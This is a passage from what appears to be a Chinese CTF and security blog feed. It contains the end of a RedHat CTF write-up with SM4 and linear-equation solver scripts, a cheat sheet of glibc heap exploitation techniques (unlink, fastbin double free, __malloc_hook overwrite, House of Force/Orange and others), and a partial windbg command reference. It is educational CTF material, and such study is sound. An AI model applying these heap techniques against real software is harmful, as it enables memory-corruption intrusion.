class="number">0x55</span>,  <span class="number">0x81</span>,</span><br><span class="line">        <span class="number">0x61</span>,  <span class="number">0xf</span>,  <span class="number">0xff</span>,  <span class="number">0x14</span>,  <span class="number">0x6e</span>,  <span class="number">0x1c</span>,  <span class="number">0x48</span>,  <span class="number">0x28</span>,</span><br><span class="line">        <span class="number">0x79</span>,  <span class="number">0x9f</span>,  <span class="number">0x85</span>,  <span class="number">0xaf</span>,  <span class="number">0xc5</span>,  <span class="number">0x58</span>,  <span class="number">0xd</span>,  <span class="number">0xd6</span>,</span><br><span class="line">        <span class="number">0xa5</span>,  <span class="number">0xd9</span>,  <span class="number">0x64</span>,  <span class="number">0xfd</span>,  <span class="number">0x46</span>,  <span class="number">0x9</span>,  <span class="number">0x8c</span>,  <span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0x3b</span>,  <span class="number">0xa5</span>,  <span class="number">0x37</span>,  <span class="number">0x62</span>,  <span class="number">0x5a</span>,  <span class="number">0xa6</span>,  <span class="number">0xd2</span>,  <span class="number">0x4b</span>,</span><br><span class="line">    ]</span><br><span class="line">    v9 = <span class="number">51</span></span><br><span class="line">    cipherText = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> v9 - <span class="number">51</span> &lt; <span class="number">48</span>:</span><br><span class="line">        cipherText += <span class="string">"&#123;:02x&#125;"</span>.format(secret[v9<span class="number">-51</span>] ^ v9)</span><br><span class="line">        v9 += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> cipherText.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = getKey().encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"key is &#123;&#125;"</span>.format(key)</span><br><span class="line">cipherText = getCipherText().encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"cipherText is &#123;&#125;"</span>.format(cipherText)</span><br><span class="line">sm4 = SM4(key=key)</span><br><span class="line">msg = sm4.sm4_decrypt(cipherText, SM4_ECB)</span><br><span class="line"><span class="keyword">print</span> msg.decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure><h3 id="crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><p>3dlight，当时就考虑用解多元一次方程组的方法来求解，当时搞不动了，后来抽空写了下生成系数矩阵的脚本，迎刃而解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2arr</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [[[(ord(str[i * <span class="number">8</span> + j]) &gt;&gt; k &amp; <span class="number">1</span>) <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">8</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">8</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2arr_rev</span><span class="params">(arr)</span>:</span></span><br><span class="line">    ret = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">            ret += chr(int(<span class="string">''</span>.join(map(str, arr[i][j][::<span class="number">-1</span>])), <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arr2str</span><span class="params">(arr)</span>:</span></span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">                ret += chr(arr[i][j][k])</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arr2str_rev</span><span class="params">(str2)</span>:</span></span><br><span class="line">    ret = [[[<span class="number">0</span> <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">8</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">8</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">                ret[i][j][k] = ord(str2[i*<span class="number">64</span>+j*<span class="number">8</span>+k])</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(x, y, z)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> x &lt; <span class="number">0</span> <span class="keyword">or</span> x &gt; <span class="number">7</span> <span class="keyword">or</span> y &lt; <span class="number">0</span> <span class="keyword">or</span> y &gt; <span class="number">7</span> <span class="keyword">or</span> z &lt; <span class="number">0</span> <span class="keyword">or</span> z &gt; <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">light</span><span class="params">(arr, i, j, k, x, y, z, power)</span>:</span> <span class="comment"># square</span></span><br><span class="line">    <span class="keyword">if</span> check(i + x, j + y, k + z):</span><br><span class="line">        arr[i + x][j + y][k + z] += power  <span class="comment"># top right</span></span><br><span class="line">    <span class="keyword">if</span> x != <span class="number">0</span> <span class="keyword">and</span> check(i - x, j + y, k + z):</span><br><span class="line">        arr[i - x][j + y][k + z] += power <span class="comment">#</span></span><br><span class="line">    <span class="keyword">if</span> y != <span class="number">0</span> <span class="keyword">and</span> check(i + x, j - y, k + z):</span><br><span class="line">        arr[i + x][j - y][k + z] += power</span><br><span class="line">    <span class="keyword">if</span> z != <span class="number">0</span> <span class="keyword">and</span> check(i + x, j + y, k - z):</span><br><span class="line">        arr[i + x][j + y][k - z] += power</span><br><span class="line">    <span class="keyword">if</span> x != <span class="number">0</span> <span class="keyword">and</span> y != <span class="number">0</span> <span class="keyword">and</span> check(i - x, j - y, k + z):</span><br><span class="line">        arr[i - x][j - y][k + z] += power</span><br><span class="line">    <span class="keyword">if</span> x != <span class="number">0</span> <span class="keyword">and</span> z != <span class="number">0</span> <span class="keyword">and</span> check(i - x, j + y, k - z):</span><br><span class="line">        arr[i - x][j + y][k - z] += power</span><br><span class="line">    <span class="keyword">if</span> y != <span class="number">0</span> <span class="keyword">and</span> z != <span class="number">0</span> <span class="keyword">and</span> check(i + x, j - y, k - z):</span><br><span class="line">        arr[i + x][j - y][k - z] += power</span><br><span class="line">    <span class="keyword">if</span> x != <span class="number">0</span> <span class="keyword">and</span> y != <span class="number">0</span> <span class="keyword">and</span> z != <span class="number">0</span> <span class="keyword">and</span> check(i - x, j - y, k - z):</span><br><span class="line">        arr[i - x][j - y][k - z] += power</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(flag, power)</span>:</span></span><br><span class="line">    ret = [[[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">8</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">8</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">8</span>)]</span><br><span class="line">    lights = str2arr(flag)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">                <span class="keyword">if</span> lights[i][j][k] == <span class="number">1</span>: <span class="comment"># bit is 1</span></span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> range(power):</span><br><span class="line">                        <span class="keyword">for</span> y <span class="keyword">in</span> range(power - x):</span><br><span class="line">                            <span class="keyword">for</span> z <span class="keyword">in</span> range(power - x - y):</span><br><span class="line">                                light(ret, i, j, k, x, y, z, power - x - y - z)</span><br><span class="line">    <span class="keyword">return</span> arr2str(ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getMatrix</span><span class="params">()</span>:</span></span><br><span class="line">    A = [[ <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>**<span class="number">3</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>**<span class="number">3</span>)]</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(len(A)):</span><br><span class="line">        ord_x = row / <span class="number">8</span>**<span class="number">2</span></span><br><span class="line">        ord_y = (row - ord_x*(<span class="number">8</span>**<span class="number">2</span>))/<span class="number">8</span></span><br><span class="line">        ord_z = row % <span class="number">8</span></span><br><span class="line">        A[row][ord_x * <span class="number">8</span>**<span class="number">2</span> + ord_y * <span class="number">8</span> + ord_z] = <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> ord_x &gt; <span class="number">0</span>:</span><br><span class="line">            A[row][(ord_x<span class="number">-1</span>)* <span class="number">8</span>**<span class="number">2</span> + ord_y*<span class="number">8</span> + ord_z] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> ord_x &lt; <span class="number">7</span>:</span><br><span class="line">            A[row][(ord_x+<span class="number">1</span>)* <span class="number">8</span>**<span class="number">2</span> + ord_y*<span class="number">8</span> + ord_z] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> ord_y &gt; <span class="number">0</span>:</span><br><span class="line">            A[row][ord_x* <span class="number">8</span>**<span class="number">2</span> + (ord_y<span class="number">-1</span>) *<span class="number">8</span> + ord_z] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> ord_y &lt; <span class="number">7</span>:</span><br><span class="line">            A[row][ord_x* <span class="number">8</span>**<span class="number">2</span> + (ord_y+<span class="number">1</span>) *<span class="number">8</span> + ord_z] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> ord_z &gt; <span class="number">0</span>:</span><br><span class="line">            A[row][ord_x * <span class="number">8</span>**<span class="number">2</span> + ord_y * <span class="number">8</span> + ord_z <span class="number">-1</span> ] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> ord_z &lt; <span class="number">7</span>:</span><br><span class="line">            A[row][ord_x * <span class="number">8</span>**<span class="number">2</span> + ord_y * <span class="number">8</span> + ord_z + <span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> np.array(A)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCipher</span><span class="params">()</span>:</span></span><br><span class="line">    flag = <span class="string">"flag&#123;abcdefg_hij_klm_nop_qrst_uvwxyz_0123456789_1234567890__xyz&#125;"</span></span><br><span class="line">    shuffle_flag = <span class="string">''</span>.join(flag[<span class="number">0</span>::<span class="number">2</span>][i] + flag[<span class="number">-1</span>::<span class="number">-2</span>][i] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">32</span>))</span><br><span class="line">    cipher = encrypt(shuffle_flag, <span class="number">2</span>)</span><br><span class="line">    CipherArr =arr2str_rev(cipher)</span><br><span class="line">    <span class="keyword">return</span> np.array(CipherArr).flatten()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">()</span>:</span></span><br><span class="line">    solvea = np.linalg.solve(getMatrix(), getCipher())</span><br><span class="line">    t = []</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> solvea:</span><br><span class="line">        <span class="keyword">if</span> abs(a) &lt; <span class="number">0.0001</span>:</span><br><span class="line">            t.append(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            t.append(<span class="number">1</span>)</span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(t), <span class="number">8</span>):</span><br><span class="line">        flag += chr(int(<span class="string">''</span>.join(map(str, t[i:i+<span class="number">8</span>]))[::<span class="number">-1</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(flag[<span class="number">0</span>::<span class="number">2</span>][i] + flag[<span class="number">-1</span>::<span class="number">-2</span>][i] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> decrypt()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;熬了一天，感觉pwn和re的水平退步不少。&lt;/p&gt;
&lt;h3 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h3&gt;&lt;p&gt;这次比赛中的pwn的题目难度一般，3个pwn分别涉及到&lt;/p&gt;
&lt;ul&gt;

      
    
    </summary>
    
      <category term="ctf" scheme="https://skysider.github.io/categories/ctf/"/>
    
    
      <category term="pwn" scheme="https://skysider.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://skysider.github.io/tags/ctf/"/>
    
      <category term="redhat" scheme="https://skysider.github.io/tags/redhat/"/>
    
      <category term="reverse" scheme="https://skysider.github.io/tags/reverse/"/>
    
      <category term="crypto" scheme="https://skysider.github.io/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>heap exploit tips</title>
    <link href="https://skysider.github.io/2018/04/24/heap-exploit-tips/"/>
    <id>https://skysider.github.io/2018/04/24/heap-exploit-tips/</id>
    <published>2018-04-24T09:12:25.000Z</published>
    <updated>2018-05-12T03:39:46.105Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-comm-tips"><a href="#1-comm-tips" class="headerlink" title="1. comm tips:"></a>1. comm tips:</h3><ul><li><code>environ</code>指向的地址 -30*size 为 <code>main</code>函数的返回地址的栈地址</li><li>申请分配large chunk时，会进行 <code>malloc_consolidate</code>，清空<code>fastbins</code>表，进行合并</li><li><code>scanf</code>, <code>printf</code>当输入、输出过长时，会调用<code>malloc</code>、<code>free</code></li><li>addr(<code>main\_arena</code>)-0x10 = addr(<code>__malloc_hook</code>)</li><li><code>malloc</code>、<code>calloc</code>、<code>realloc</code>区别<ul><li><code>calloc</code> 在分配后会自动进行清空</li><li>当<code>realloc(ptr,size)</code>的size不等于ptr的size时<ul><li>如果申请size&gt;原来size<ul><li>如果chunk与top chunk相邻，直接扩展这个chunk到新size大小</li><li>如果chunk与top chunk不相邻，相当于<code>free(ptr)</code>,<code>malloc(new_size)</code></li></ul></li><li>如果申请size&lt;原来size<ul><li>如果相差不足以容得下一个最小chunk(64位下32个字节，32位下16个字节)，则保持不变</li><li>如果相差可以容得下一个最小chunk，则切割原chunk为两部分，free掉后一部分</li></ul></li></ul></li><li>当<code>realloc(ptr,size)</code>的size等于0时，相当于free(ptr)</li><li>当<code>realloc(ptr,size)</code>的size等于ptr的size，不进行任何操作</li></ul></li></ul><h3 id="2-heap-exploit"><a href="#2-Heap-exploit" class="headerlink" title="2. Heap exploit"></a>2. Heap exploit</h3><h4 id="unlink-attack"><a href="#unlink-attack" class="headerlink" title="unlink attack"></a>unlink attack</h4><ul><li><p>条件：</p><ul><li>存在堆溢出，可以伪造堆块和控制下一个堆块的头部</li><li>存在全局指针ptr指向堆块</li></ul></li><li><p>方法：</p><ul><li>伪造堆块<ul><li>fd=ptr-size*3</li><li>bk=ptr-size*2</li></ul></li><li>unlink成功之后<ul><li>ptr=ptr-size*3</li><li>编辑ptr指向的内容，修改ptr指向got表，再编辑ptr即可overwrite got表</li></ul></li></ul></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">chunk0                malloc返回的ptr           chunk1        malloc返回的ptr</span><br><span class="line">|                     |                        |             |</span><br><span class="line">+-----------+---------+----+----+----+----+----+------+------+----+----+------+</span><br><span class="line">|           |         |fake|fake|fake|fake| D  | fake | fake |    |    |      |</span><br><span class="line">|           |         |prev|size| FD | BK | A  | prev | size&amp;|    |    |      |</span><br><span class="line">| prev_size |size&amp;Flag|size|    |    |    | T  | size | flag |    |    |      |</span><br><span class="line">|           |         |    |    |    |    | A  |      |      |    |    |      |</span><br><span class="line">|           |         |    |    |    |    |    |      |      |    |    |      |</span><br><span class="line">+-----------+---------+----+----+----+----+----+------+------+----+----+------+</span><br><span class="line">                      |--------new_size--------|</span><br></pre></td></tr></table></figure></li></ul><h4 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h4><ul><li>house of spirit<ul><li>伪造chunk，free之后再次申请chunk进行攻击</li></ul></li><li>double free<ul><li>重复释放同一个chunk，实现类似类型混淆的效果</li><li><img src="https://i.loli.net/2018/05/12/5af65e6796438.png" alt="f86cf21b984d249fae8e07f3758a1643.png"></li></ul></li><li>Arbitrary Alloc<ul><li>利用：<code>__malloc_hook</code>地址-0x28+5 作为伪造的fd指针（地址错位）</li><li><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span>2 = (void *(**)(size_t, const void *)) 0x7ff5dd109b10 &lt;__malloc_hook&gt;</span><br><span class="line"><span class="meta">pwndbg&gt;</span> dqs 0x7ff5dd109b10-0x28+5</span><br><span class="line">00:0000│ 0x7ff5dd109aed (_IO_wide_data_0+301) ◂— 0xf5dd108260000000</span><br><span class="line">01:0008│ 0x7ff5dd109af5 (_IO_wide_data_0+309) ◂— 0x7f</span><br><span class="line">02:0010│ 0x7ff5dd109afd ◂— 0xf5dcdcae20000000</span><br><span class="line">03:0018│ 0x7ff5dd109b05 (__memalign_hook+5) ◂— 0xf5dcdcaa0000007f</span><br><span class="line">04:0020│ 0x7ff5dd109b0d (__realloc_hook+5) ◂— 0x7f</span><br><span class="line">05:0028│ 0x7ff5dd109b15 (__malloc_hook+5) ◂— 0x0</span><br><span class="line">...</span><br><span class="line">07:0038│ 0x7ff5dd109b25 (main_arena+5) ◂— 0xc7604a04a0000000</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h4><ul><li>条件：<ul><li>能够控制 Unsorted Bin Chunk 的 bk 指针(bk = target_addr - 0x10)。</li></ul></li><li>效果：<ul><li>实现修改任意地址值为一个较大的数值(unsorte bin地址），例如 <code>global_max_fast</code>，例如<code>_IO_list_all</code>（house of orange)</li></ul></li></ul><h4 id="house-of-loresmall-bin-attack"><a href="#House-of-Lore（small-bin-attack）" class="headerlink" title="House of Lore（small bin attack）"></a>House of Lore（small bin attack）</h4><ul><li>条件：<ul><li>能够修改small bin中的bk指针</li></ul></li><li>方法：<ul><li>修改small bin中的bk指针指向伪造的chunk，同时令fake chunk的fd指针不等于small bin中的最后一个chunk</li></ul></li><li>效果：<ul><li>任意地址写</li></ul></li></ul><h4 id="house-of-einherjar-small或large-bin-attackfree时触发"><a href="#House-Of-Einherjar-（small或large-bin-attack）free时触发" class="headerlink" title="House Of Einherjar （small或large bin attack）free时触发"></a>House Of Einherjar （small或large bin attack）free时触发</h4><ul><li>条件：<ul><li>需要有溢出漏洞可以写物理相邻的高地址的 prev_size 与 PREV_INUSE 部分。</li><li>我们需要计算目的 chunk 与 p1 地址之间的差，所以需要泄漏地址。</li><li>我们需要在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测。</li></ul></li><li>方法：<ul><li>覆盖相邻到地址的prev_size与PREV_INUSE标志位</li></ul></li><li>效果：<ul><li>任意地址写</li></ul></li></ul><h4 id="house-of-force-top-chunk"><a href="#House-Of-Force-top-chunk" class="headerlink" title="House Of Force (top chunk)"></a>House Of Force (top chunk)</h4><ul><li>条件：<ul><li>能够以溢出等方式控制到 top chunk 的 size 域</li><li>能够自由地控制堆分配尺寸的大小</li></ul></li><li>方法：<ul><li>修改top chunk size域为-1，然后分配指定大小的堆块（计算偏移）</li></ul></li><li>效果：<ul><li>能够在任意地址分配堆块，实现任意地址写</li></ul></li></ul><h4 id="house-of-orange-top-chunk-unsorted-bin-file-attack"><a href="#House-Of-Orange-top-chunk-unsorted-bin-FILE-attack" class="headerlink" title="House Of Orange (top chunk + unsorted bin + FILE attack)"></a>House Of Orange (top chunk + unsorted bin + FILE attack)</h4><ul><li>条件：<ul><li>首先需要目标漏洞是堆上的漏洞</li><li>不存在free函数或其他释放堆块的函数</li></ul></li><li>方法：<ul><li>伪造top chunk的size，满足<ol><li>伪造的size必须要对齐到内存页</li><li>size要大于MINSIZE(0x10)</li><li>size要小于之后申请的chunk size + MINSIZE(0x10)</li><li>size的prev inuse位必须为1</li></ol></li></ul></li><li>效果：<ul><li>control the world</li></ul></li></ul><h3 id="参考"><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/heap/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/heap/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1-comm-tips&quot;&gt;&lt;a href=&quot;#1-comm-tips&quot; class=&quot;headerlink&quot; title=&quot;1. comm tips:&quot;&gt;&lt;/a&gt;1. comm tips:&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;environ&lt;/code&gt;指向的地
      
    
    </summary>
    
      <category term="ctf" scheme="https://skysider.github.io/categories/ctf/"/>
    
    
      <category term="pwn" scheme="https://skysider.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>windbg常用命令</title>
    <link href="https://skysider.github.io/2017/07/29/windbg%E6%89%8B%E5%86%8C/"/>
    <id>https://skysider.github.io/2017/07/29/windbg手册/</id>
    <published>2017-07-29T07:41:14.000Z</published>
    <updated>2018-05-12T03:53:43.331Z</updated>
    
    <content type="html"><![CDATA[<h3 id="命令介绍"><a href="#命令介绍" class="headerlink" title="命令介绍"></a>命令介绍</h3><p>windbg支持三种类型的命令，<strong>标准命令</strong>、<strong>元命令</strong>和<strong>扩展命令</strong>。 标准命令提供最基本的调试功能，不区分大小写，如<code>k</code>，<code>g</code>，<code>dt</code>，<code>bp</code>等 元命令提供标准命令没有提供的功能，也内建在调试引擎中，以 “<strong>.</strong>“ 开头，如<code>.sympath</code>, <code>.reload</code>等 扩展命令用于扩展某一方面的调试功能，实现在动态加载的扩展模块中，以 <strong>!</strong> 开头，如 <code>!analyze</code>等（需要将第三方dll文件放到winext目录，使用时先用<code>.load xxx.dll</code>加载，然后使用<code>!xxx</code>使用扩展模块功能）</p><h3 id="查看帮助"><a href="#查看帮助" class="headerlink" title="查看帮助"></a>查看帮助</h3><ul><li><code>?</code> —— 打印出所有标准命令</li><li><code>.help</code> —— 打印出所有元命令</li><li><code>.chain</code> —— 给出一个扩展命令集的链表</li><li><code>!&lt;module_name&gt;.help</code> —— 查看扩展模块帮助</li><li><code>.hh</code> —— 打开windbg的chm帮助文件</li></ul><h3 id="断点相关"><a href="#断点相关" class="headerlink" title="断点相关"></a>断点相关</h3><ul><li><code>bp &lt;address&gt;</code> —— 设置软件断点，针对某个地址，例如 <code>bp c87fb320</code>, <code>bp edgehtml!ProcessCSSText</code>，当<code>edgehtml!ProcessCSSText</code>位置发生变化时，断点的位置不变</li><li><code>bu &lt;symbol&gt;</code> ——设置延迟断点，针对符号，例如 <code>bu edgehtml!ProcessCSSText</code>，当符号地址变化时，对应的断点地址也会变化</li><li><code>bm &lt;reg&gt;</code> —— 设置符号断点，支持匹配表达式，例如 <code>bm edgehtml!Process*</code></li><li><code>ba &lt;access&gt; &lt;size&gt; &lt;addr&gt;</code> —— 设置处理器断点，access包括 e（执行）、r（读）、w（写），例如 <code>ba w4 0xcccccccc</code></li><li><code>bl</code> —— 列出所有断点</li><li><code>be &lt;index&gt;</code> —— 激活指定编号断点</li><li><code>bd &lt;index&gt;</code> —— 禁止断点</li><li><code>bc &lt;index&gt;</code> —— 清除断点</li></ul><h3 id="读写搜索内存"><a href="#读写-搜索内存" class="headerlink" title="读写/搜索内存"></a>读写/搜索内存</h3><ul><li><code>!address</code> —— 查看进程的所有内存页属性<ul><li><code>!address —summary</code>，显示进程的内存统计信息</li><li><code>!address 7ffd8000</code> ，查看7ffd8000地址处内存页属性</li></ul></li><li><code>d &lt;type&gt; &lt;address range&gt;</code> ——根据指定的类型查看存储在某地址中的数据<ul><li><code>da</code> —— 显示ASCII字符，每行最多显示48字符，例如 <code>da rip</code>, <code>da rip L4</code>, <code>da rip rip+16</code></li><li><code>db</code> —— 显示字节值和ASCII字符</li><li><code>dw</code> —— 显示字值（2字节）</li><li><code>dd</code> —— 显示双字，默认长度为32 Dwords，<code>dd poi(ebp+4)</code>，poi——解引用指针</li><li><code>dD</code> —— 显示双精度浮点数（8字节），默认 15 个数字</li><li><code>df</code> —— 显示单精度浮点数（4字节），默认 16个数字</li><li><code>dq</code> —— 显示四字值（8字节）</li><li><code>du</code> —— 显示Unicode字符串</li><li><code>ds</code> —— 显示ASCII字符串</li></ul></li><li><code>d&lt;type&gt;s &lt;address range&gt;</code> —— 打印地址上的二进制值，同时搜索符号信息<ul><li><code>dds 0xdeafbeaf L20</code> —— 打印0xdeafbeaf开始的0x20个双字二进制值，并检索符号</li><li><code>dqs 0xdeadbeafdeadbeaf</code>—— 打印0xdeafbeaf开始的16（默认值）个四字二进制值，并检索符号</li></ul></li><li><code>e &lt;type&gt; &lt;address&gt; &lt;value&gt;</code> —— 修改指定内存中的数据<ul><li><code>ea 0x445634 &quot;abc&quot;</code> ——在0x445634地址写入ASCII字符串abc，不包含结束符0</li><li><code>eza 0x445634 &quot;abc&quot;</code> —— 